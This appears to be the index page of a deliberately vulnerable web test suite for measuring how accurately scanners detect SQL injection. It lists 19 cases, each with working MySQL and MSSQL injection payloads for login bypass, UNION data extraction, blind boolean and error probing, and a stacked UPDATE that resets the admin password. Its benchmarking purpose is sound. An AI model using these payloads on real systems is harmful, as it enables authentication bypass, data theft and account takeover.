<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Evaluation of SQL Injection Detection Accuracy - HTTP GET Method</title>
</head>
<body>
<center><font size="5">Test Cases - HTTP 200 Responses With Differentiation:</font></center><br><br>

<B><a href="Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp?username=textvalue&password=textvalue2">Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp</a></B><br>
  Injection into string values in the scope of a query within a login page with different valid responses.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  'or'[value]'='[value]<br>
  'or [value]=[value][comment][space]<br>
  <U>Examples of Login Bypass Exploits:</U><br>
  Exploit (both input fields): 'or'7'='7<br>
  Independent Exploit 1: ' or 7=7--%20 <br>
  Independent Exploit 2: ' or 7=7#%20 <br>
  Independent Exploit 3: ' or 7=7/*%20 <br>
  <br>
  
<B><a href="Case02-InjectionInSearch-String-UnionExploit-WithDifferent200Responses.jsp?msg=textvalue">Case02-InjectionInSearch-String-UnionExploit-WithDifferent200Responses.jsp</a></B><br>
  Injection into string values in the scope of a query within a search page with different valid responses.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  ' UNION SELECT [int], [string], [string] FROM [table] [comment mark][space] <br>
  <U>Examples of Union Exploits:</U><br>
  Exploit: 'or'7'='7<br>
  MSSQL Exploit: ' UNION SELECT id, name, 'jfks' FROM sysobjects--%20 <br>
  MySQL Exploit: ' UNION SELECT 1, table_name, 'jfks' FROM information_schema.tables--%20 <br>
  MySQL Exploit (No Comments): ' UNION SELECT 1, table_name, 'jfks' FROM information_schema.tables WHERE table_name like'%25 <br>
  <br>
  
<B><a href="Case03-InjectionInCalc-String-BooleanExploit-WithDifferent200Responses.jsp?username=textvalue">Case03-InjectionInCalc-String-BooleanExploit-WithDifferent200Responses.jsp</a></B><br>
  Injection into string values in the scope of a query within a calculation page with different valid responses.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  InvalidValue' OR EXISTS (SELECT * FROM [table] WHERE [field] like '[value]%')[comment mark][space]<br>  
  InvalidValue' OR EXISTS (SELECT * FROM [table] WHERE [field] > '[value]')[comment mark][space]<br>
  <U>Examples of Boolean Exploits:</U><br>
  MSSQL Exploit: InvalidValue624' OR EXISTS (SELECT * FROM sysobjects WHERE name > 's')--%20 <br>
  MySQL Exploit (No Comments): InvalidValue624' OR EXISTS (SELECT * FROM information_schema.tables WHERE table_name > 'u') and '1'='1<br>
  <br>

<B><a href="Case04-InjectionInUpdate-String-CommandInjection-WithDifferent200Responses.jsp?msg=textvalue">Case04-InjectionInUpdate-String-CommandInjection-WithDifferent200Responses.jsp</a></B><br>
  Injection into string values in the scope of a query within an update page with different valid responses.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>SQL Statement Context:</U><br>
  UPDATE (SET Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  Value'; UPDATE [table] SET [field]='value';[comment mark][space] <br>  
  InvalidValue', [field]=(SELECT [FieldName] FROM [TableName] WHERE [FieldName] like'UniqueValue')[comment mark][space]<br>
  <U>Examples of Sql Command Injection Exploits:</U><br>
  MSSQL Exploit: Message'; UPDATE users SET password='1234' WHERE username='admin';--%20 <br>
  <U>Examples of Deliberate Runtime Error Binary Exploits:</U><br>
  A single result in the subquery (or none) will not cause a runtime exception, more will<br>
  MySQL Exploit: ', message=(SELECT TABLE_NAME FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES')--%20  <br>
  MySQL Exploit (No Comments): ', message=(SELECT TABLE_NAME FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES'), message='a <br>
  <br> 

<B><a href="Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp?orderby=msgid">Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp</a></B><br>
  Injection into an order by clause in the scope of a query within a search page with different valid responses.<br>
  <U>Barriers:</U><br>
  Non functional Semicolon (input validation)<br>
  Injection into an order by clause<br>
  <U>SQL Statement Context:</U><br>
  SELECT (ORDER BY Clause)<br>
  <U>Sample Exploit Structures (Instead of order by field name or index):</U><br>  
  (SELECT 1 FROM [TableName] WHERE [FieldName] like'UniqueValue')[comment mark][space]<br>
  <U>Examples of Deliberate Runtime Error Binary Exploits (replace the entire original input):</U><br>
  A single result in the subquery (or none) will not cause a runtime exception, more will<br>
  MSSQL Exploit: (SELECT 1 FROM sysobjects WHERE name like'sysusers')--%20 <br>
  MySQL Exploit (No Comments): (SELECT 1 FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES') <br>
  <br>

<B><a href="Case06-InjectionInView-Numeric-PermissionBypass-WithDifferent200Responses.jsp?transactionId=132">Case06-InjectionInView-Numeric-PermissionBypass-WithDifferent200Responses.jsp</a></B><br>
  Injection into a numeric value in the scope of a query within a private resource view page with different valid responses.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  [number] or [value]=[value] or [value]=[value]<br>
  [number] or [value]=[value][comment][space]<br>
  <U>Examples of Permission Bypass Exploits:</U><br>
  Exploit 1: 1 or 7=7--%20 <br>
  Exploit 2: 1 or 7=7#%20 <br>
  Exploit 3: 1 or 7=7/*%20 <br>
  Exploit 4 (No Comments): 1 or 7=7 or 7=7<br>
  <br>

<B><a href="Case07-InjectionInSearch-Numeric-UnionExploit-WithDifferent200Responses.jsp?msgId=1">Case07-InjectionInSearch-Numeric-UnionExploit-WithDifferent200Responses.jsp</a></B><br>
  Injection into numeric values in the scope of a query within a search page with different valid responses.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  1 UNION SELECT [int], [string], [string] FROM [table] [comment mark][space] <br>
  <U>Examples of Union Exploits:</U><br>
  Exploit: 1 or 7=7<br>
  MSSQL Exploit: 1 UNION SELECT id, name, 'jfks' FROM sysobjects--%20 <br>
  MySQL Exploit: 1 UNION SELECT 1, table_name, 'jfks' FROM information_schema.tables--%20 <br>
  MySQL Exploit (No Comments): 1 UNION SELECT 1, table_name, 'jfks' FROM information_schema.tables WHERE 1=1 OR 1=1 <br>
  <br>

<B><a href="Case08-InjectionInCalc-Numeric-BooleanExploit-WithDifferent200Responses.jsp?minBalanace=10000">Case08-InjectionInCalc-Numeric-BooleanExploit-WithDifferent200Responses.jsp</a></B><br>
  Injection into numeric values in the scope of a query within a calculation page with different valid responses.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  100000000 OR EXISTS (SELECT * FROM [table] WHERE [field] like '[value]%')[comment mark][space]<br>  
  100000000 OR EXISTS (SELECT * FROM [table] WHERE [field] > '[value]')[comment mark][space]<br>
  <U>Examples of Boolean Exploits:</U><br>
  MSSQL Exploit: 100000000 OR EXISTS (SELECT * FROM sysobjects WHERE name > 's')--%20 <br>
  MySQL Exploit (No Comments): 100000000 OR EXISTS (SELECT * FROM information_schema.tables WHERE table_name > 'u') <br>
  <br>

<B><a href="Case09-InjectionInUpdate-Numeric-CommandInjection-WithDifferent200Responses.jsp?msgid=1">Case09-InjectionInUpdate-Numeric-CommandInjection-WithDifferent200Responses.jsp</a></B><br>
  Injection into numeric values in the scope of a query within an update page with different valid responses.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>SQL Statement Context:</U><br>
  UPDATE (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  [InvalidNumericValue]; UPDATE [table] SET [field]='value';[comment mark][space] <br>  
  [InvalidNumericValue] OR 1=(SELECT [FieldName] FROM [TableName] WHERE [FieldName] like'UniqueValue')[comment mark][space]<br>
  <U>Examples of Sql Command Injection Exploits:</U><br>
  MSSQL Exploit: 0; UPDATE users SET password='1234' WHERE username='admin';--%20 <br>
  <U>Examples of Deliberate Runtime Error Binary Exploits:</U><br>
  A single result in the subquery (or none) will not cause a runtime exception, more will<br>
  MySQL Exploit: 0 OR 1=(SELECT TABLE_NAME FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES')--%20  <br>
  MySQL Exploit (No Comments): 0 OR 1=(SELECT TABLE_NAME FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES')<br>
  <br> 

<B><a href="Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp?orderby=1">Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp</a></B><br>
  Injection into an order by clause (numeric index) in the scope of a query within a search page with different valid responses.<br>
  <U>Barriers:</U><br>
  Non functional Semicolon (input validation)<br>
  Injection into an order by clause<br>
  <U>SQL Statement Context:</U><br>
  SELECT (ORDER BY Clause)<br>
  <U>Sample Exploit Structures (Instead of order by field name or index):</U><br>  
  (SELECT 1 FROM [TableName] WHERE [FieldName] like'UniqueValue')[comment mark][space]<br>
  <U>Examples of Deliberate Runtime Error Binary Exploits (replace the entire original input):</U><br>
  A single result in the subquery (or none) will not cause a runtime exception, more will<br>
  MSSQL Exploit: (SELECT 1 FROM sysobjects WHERE name like'sysusers')--%20 <br>
  MySQL Exploit (No Comments): (SELECT 1 FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES') <br>
  <br>

<B><a href="Case11-InjectionInView-Date-PermissionBypass-WithDifferent200Responses.jsp?transactionDate=2010-01-01">Case11-InjectionInView-Date-PermissionBypass-WithDifferent200Responses.jsp</a></B><br>
  Injection into a date value in the scope of a query within a private resource view page with different valid responses.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  [date value - YYYY-MM-DD]' or [value]=[value] or '[value]'='[value]<br>
  [date value - YYYY-MM-DD]' or [value]=[value][comment][space]<br>
  <U>Examples of Permission Bypass Exploits:</U><br>
  Exploit 1 (MySql): 2010-01-01' or 7=7--%20 <br>
  Exploit 2 (MySql): 2010-01-01' or 7=7#%20 <br>
  Exploit 3 (MySql): 2010-01-01' or 7=7/*%20 <br>
  Exploit 4 (MySql, No Comments): 2010-01-01' or 7=7 or '7'='7<br>
  <br>

<B><a href="Case12-InjectionInSearch-Date-UnionExploit-WithDifferent200Responses.jsp?transactionDate=2010-01-01">Case12-InjectionInSearch-Date-UnionExploit-WithDifferent200Responses.jsp</a></B><br>
  Injection into date values in the scope of a query within a search page with different valid responses.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  [date value - YYYY-MM-DD]' UNION SELECT [int], [string], [string] FROM [table] [comment mark][space] <br>
  <U>Examples of Union Exploits:</U><br>
  Exploit: 2010-01-01'or'7'='7<br>
  MSSQL Exploit: 2010-01-01' UNION SELECT 1,id, name, '2010-01-01' FROM sysobjects--%20 <br>
  MySQL Exploit: 2010-01-01' UNION SELECT 1, 1, table_name, '2010-01-01' FROM information_schema.tables--%20 <br>
  MySQL Exploit (No Comments): 2010-01-01' UNION SELECT 1, 1, table_name, '2010-01-01' FROM information_schema.tables WHERE 1=1 OR '1'='1 <br>
  <br>

<B><a href="Case13-InjectionInCalc-Date-BooleanExploit-WithDifferent200Responses.jsp?transactionDate=2010-01-01">Case13-InjectionInCalc-Date-BooleanExploit-WithDifferent200Responses.jsp</a></B><br>
  Injection into date values in the scope of a query within a calculation page with different valid responses.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  [date value - YYYY-MM-YY]' OR EXISTS (SELECT * FROM [table] WHERE [field] like '[value]%')[comment mark][space]<br>  
  [date value - YYYY-MM-YY]' OR EXISTS (SELECT * FROM [table] WHERE [field] > '[value]')[comment mark][space]<br>
  <U>Examples of Boolean Exploits:</U><br>
  MSSQL Exploit: 1900-01-01' OR EXISTS (SELECT * FROM sysobjects WHERE name > 's')--%20 <br>
  MySQL Exploit: 1900-01-01' OR EXISTS (SELECT * FROM information_schema.tables WHERE table_name > 'u')--%20 <br>
  <br>

<B><a href="Case14-InjectionInUpdate-Date-CommandInjection-WithDifferent200Responses.jsp?transactionDate=2010-02-02">Case14-InjectionInUpdate-Date-CommandInjection-WithDifferent200Responses.jsp</a></B><br>
  Injection into date values in the scope of a query within an update page with different valid responses.<br>
  <U>Barriers:</U><br>
  None<br>
  <U>SQL Statement Context:</U><br>
  UPDATE (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  [InvalidDateValue]'; UPDATE [table] SET [field]='value';[comment mark][space] <br>  
  [InvalidDateValue]' OR 1=(SELECT [FieldName] FROM [TableName] WHERE [FieldName] like'UniqueValue')[comment mark][space]<br>
  <U>Examples of Sql Command Injection Exploits:</U><br>
  MSSQL Exploit: 1900-01-01'; UPDATE users SET password='1234' WHERE username='admin';--%20 <br>
  <U>Examples of Deliberate Runtime Error Binary Exploits:</U><br>
  A single result in the subquery (or none) will not cause a runtime exception, more will<br>
  MySQL Exploit: 1900-01-01' OR 1=(SELECT TABLE_NAME FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES')--%20  <br>
  MySQL Exploit (No Comments): 1900-01-01' OR 1=(SELECT TABLE_NAME FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES') AND '1'='1<br>
  <br> 

<B><a href="Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp?transactionDate=2010-02-02">Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp</a></B><br>
  Injection into date values in the scope of a query within a view page with different valid responses.<br>
  <U>Barriers:</U><br>
  Single Quote & Double Quote Input Validation <br>
  Injection Into Date Field Without Quotes (Rare) <br> 
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  [Date Retrieval DB Specific Function] UNION SELECT [FieldList] FROM [TABLE][comment mark][space] <br>  
  [Current Date DB Specific Function] UNION SELECT [FieldList] FROM [TABLE])[comment mark][space]<br>
  <U>Sample Exploit Structures (MySQL - will only work via driver, will fail when executed through the query browser):</U><br>
  YYYY-MM-DD UNION SELECT [FieldList] FROM [TABLE][comment mark][space] <br>
  <U>Examples of Union Exploits (Date Retrieval Methods):</U><br>
  (MySQL - CURDATE(), MSSQL - getDate()) <br>
  MySQL Exploit: CURDATE() UNION SELECT 1,1,TABLE_NAME,CURDATE() FROM information_schema.TABLES--%20  <br>
  MySQL Exploit (No Comments): CURDATE() UNION SELECT 1,1,TABLE_NAME,CURDATE() FROM information_schema.TABLES<br>
  MySQL Exploit (Date without quotes exploit): 2010-01-02 UNION SELECT 1,1,TABLE_NAME,CURDATE() FROM information_schema.TABLES--%20<br>
  <br> 

<B><a href="Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithDifferent200Responses.jsp?transactionId=132">Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithDifferent200Responses.jsp</a></B><br>
  Injection into a numeric value in the scope of a query within a private resource view page with different valid responses and quote validation.<br>
  <U>Barriers:</U><br>
  Single Quote & Double Quote Input Validation <br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  [number] or [value]=[value] or [value]=[value]<br>
  [number] or [value]=[value][comment][space]<br>
  <U>Examples of Permission Bypass Exploits:</U><br>
  Exploit 1: 1 or 7=7--%20 <br>
  Exploit 2: 1 or 7=7#%20 <br>
  Exploit 3: 1 or 7=7/*%20 <br>
  Exploit 4 (No Comments): 1 or 7=7 or 7=7<br>
  <br>

<B><a href="Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp?msgId=1">Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithDifferent200Responses.jsp</a></B><br>
  Injection into numeric values in the scope of a query within a search page with different valid responses and quote validation.<br>
  <U>Barriers:</U><br>
  Single Quote & Double Quote Input Validation <br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  1 UNION SELECT [int], [string], [string] FROM [table] [comment mark][space] <br>
  <U>Examples of Union Exploits:</U><br>
  Exploit: 1 or 7=7<br>
  MSSQL Exploit: 1 UNION SELECT id, name, null FROM sysobjects--%20 <br>
  MySQL Exploit: 1 UNION SELECT 1, table_name, null FROM information_schema.tables--%20 <br>
  MySQL Exploit (No Comments): 1 UNION SELECT 1, table_name, null FROM information_schema.tables WHERE 1=1 OR 1=1 <br>
  <br>

<B><a href="Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithDifferent200Responses.jsp?minBalanace=10000">Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithDifferent200Responses.jsp</a></B><br>
  Injection into numeric values in the scope of a query within a calculation page with different valid responses and quote validation.<br>
  <U>Barriers:</U><br>
  Single Quote & Double Quote Input Validation <br>
  <U>SQL Statement Context:</U><br>
  SELECT (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  100000000 OR EXISTS (SELECT * FROM [table] WHERE [field] like [converted char value])[comment mark][space]<br>  
  100000000 OR EXISTS (SELECT * FROM [table] WHERE [field] > [converted char value])[comment mark][space]<br>
  <U>Examples of Boolean Exploits:</U><br>
  MSSQL Exploit: 100000000 OR EXISTS (SELECT * FROM sysobjects WHERE name > chr(117))--%20 <br>
  MySQL Exploit: 100000000 OR EXISTS (SELECT * FROM information_schema.tables WHERE table_name like concat(char(70),char(73),char(76),char(69),char(83)))--%20 <br>
  MySQL Exploit (No Comments): 100000000 OR EXISTS (SELECT * FROM information_schema.tables WHERE table_name > char(117)) <br>
  <br>

<B><a href="Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithDifferent200Responses.jsp?msgid=1">Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithDifferent200Responses.jsp</a></B><br>
  Injection into numeric values in the scope of a query within an update page with different valid responses.<br>
  <U>Barriers:</U><br>
  Single Quote & Double Quote Input Validation <br>
  <U>SQL Statement Context:</U><br>
  UPDATE (WHERE Clause)<br>
  <U>Sample Exploit Structures:</U><br>
  [InvalidNumericValue]; UPDATE [table] SET [field]='value';[comment mark][space] <br>  
  [InvalidNumericValue] OR 1=(SELECT [FieldName] FROM [TableName] WHERE [FieldName] like'UniqueValue')[comment mark][space]<br>
  <U>Examples of Sql Command Injection Exploits:</U><br>
  MSSQL Exploit: 0; UPDATE users SET password= chr(49)%2bchr(50)%2bchr(51)%2bchr(52) WHERE username= chr(97)%2bchr(100)%2bchr(109)%2bchr(105)%2bchr(110);--%20 <br>
  <U>Examples of Deliberate Runtime Error Binary Exploits:</U><br>
  A single result in the subquery (or none) will not cause a runtime exception, more will<br>
  MySQL Exploit: 0 OR 1=(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME like concat(char(70),char(73),char(76),char(69),char(83)))--%20  <br>
  MySQL Exploit (No Comments): 0 OR 1=(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME like concat(char(70),char(73),char(76),char(69),char(83)))<br>
  (Change WHERE condition to "like char(37)" for reponse differentiation)
  <br> 

</body>
</html>